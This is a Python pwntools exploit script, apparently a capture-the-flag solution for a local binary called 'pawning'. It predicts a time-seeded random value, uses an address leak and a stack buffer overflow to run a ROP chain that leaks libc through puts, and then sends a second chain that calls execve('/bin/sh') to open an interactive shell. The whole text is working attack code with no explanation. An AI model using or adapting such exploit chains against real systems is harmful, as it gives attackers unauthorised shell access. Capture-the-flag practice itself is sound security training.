from pwn import *
from sys import *
import ctypes

elf = context.binary = ELF("./pawning")
p = process("./pawning")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'localhost'
PORT = 10012

cmd = """
b*main
"""
if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))
addr = LIBC.rand() % 417
print(addr)
p.sendlineafter(b'? ', str(addr))
p.recvuntil(b'to you: ')	
elf.address = eval(p.recvline().rstrip()) - 0x404c

rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.puts(elf.got['puts'])
rop.call(elf.sym['main'])
print(rop.dump())
payload = b'A'*0x108
payload += rop.chain()
p.sendline(payload)
p.recvuntil(b'See yaa\n\n')

leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - libc.sym['puts']


LIBC.srand(LIBC.time(0))
addr = LIBC.rand() % 417
print(addr)
p.sendlineafter(b'? ', str(addr))

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

payload = b'A'*0x108
payload += rop.chain()
p.sendline(payload)

p.interactive()